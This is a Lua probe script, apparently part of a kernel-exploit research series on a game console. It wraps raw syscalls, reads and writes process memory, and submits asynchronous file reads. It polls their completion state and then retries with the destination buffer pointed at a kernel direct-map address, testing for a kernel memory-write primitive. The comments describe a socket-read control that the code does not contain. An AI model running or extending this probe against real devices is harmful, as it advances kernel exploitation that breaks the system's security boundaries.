-- CRASH_CLASS: HIGH
-- PROBE 754a: aio completion timing, then one kernel buffer
--
-- 750a's control (a file read with a valid buffer) stayed at state 1 while the
-- same shape completed to 3 in 747a after 30 ms. Either completion is much
-- slower than one 60 ms sample, or the first create in a process does not
-- submit. This prints the poll state at four times instead of once, for a
-- control that must succeed before the kernel buffer is tried.
--
-- A: file read, valid buffer, poll at 20/100/300/600 ms
-- B: only if A reaches 3 - file read with the buffer at the direct map base
-- C: socket read, valid buffer, feed, poll at the same times (second control
--    from a different path)
-- D: health

print("=== PROBE 754a: AIO TIMING AND ONE KERNEL BUFFER ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local sc_open = mk(5); local sc_pair = mk(135); local sc_write = mk(4)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(U(ts), U(0)) end) end
local function path(s)
    local b = to_num(memory.alloc(#s+1))
    for i=1,#s do memory.write_byte(b+i-1, s:byte(i)) end
    memory.write_byte(b+#s, 0)
    return b
end
print("[A] tid="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

local D = to_num(memory.alloc(0x2000)); local buf = to_num(memory.alloc(0x2000)); local res = to_num(memory.alloc(0x2000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local ds = to_num(memory.alloc(0x400))
zero(D,0x2000); zero(buf,0x2000); zero(res,0x2000); zero(st,0x400); zero(ds,0x400)

local function submit(fdno, b, count, mode)
    zero(D,0x100); zero(res,0x40); zero(st,0x40); zero(ds,0x40)
    wq(D+0x00, uint64(0)); wq(D+0x08, uint64(16))
    wq(D+0x10, uint64(b)); wq(D+0x18, uint64(res))
    wd(D+0x20, fdno); wd(D+0x24, 0)
    wd(ids, 0)
    local cr = call(mk(669), 1+0x1000, D, count or 1, mode or 1, ids, 0)
    return cr, rd(ids)
end
local function state_of(id)
    wd(ids, id); zero(st,0x40)
    call(mk(664), ids, 1, st, 0, 0, 0)
    return rd(st)
end
local function watch(tag, id)
    local times = {20, 100, 300, 600}
    local t = 0
    for i=1,#times do
        sleep_ms(times[i]-t); t = times[i]
        print(string.format("%s t=%dms state=%08X res=%X %X", tag, times[i], state_of(id), rd(res), rd(res+4)))
    end
end
local function del(id)
    wd(ids, id); zero(ds,0x40); call(mk(662), ids, 1, ds, 0, 0, 0)
    return rd(ds)
end

local fd = call(sc_open, path("/savedata0/thread.lua"), 0, 0, 0, 0, 0)
print("[A] open -> "..tostring(fd))
if type(fd) == "number" and fd > 2 then
    local cr, id = submit(fd, buf)
    print(string.format("[A] create ret=%s id=%08X", tostring(cr), id))
    if id ~= 0 and id ~= -1 then
        watch("[A]", id)
        print(string.format("[A] buf=%X %X %X %X delete=%08X", rd(buf), rd(buf+4), rd(buf+8), rd(buf+12), del(id)))
        print("[B] kernel buffer test")
        local cr2, id2 = submit(fd, 0xFFFFFE0000000000)
        print(string.format("[B] create ret=%s id=%08X", tostring(cr2), id2))
        if id2 ~= 0 and id2 ~= -1 then
            watch("[B]", id2)
            print(string.format("[B] delete=%08X", del(id2)))
        end
    end
end
print("[C] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 754a DONE ===")
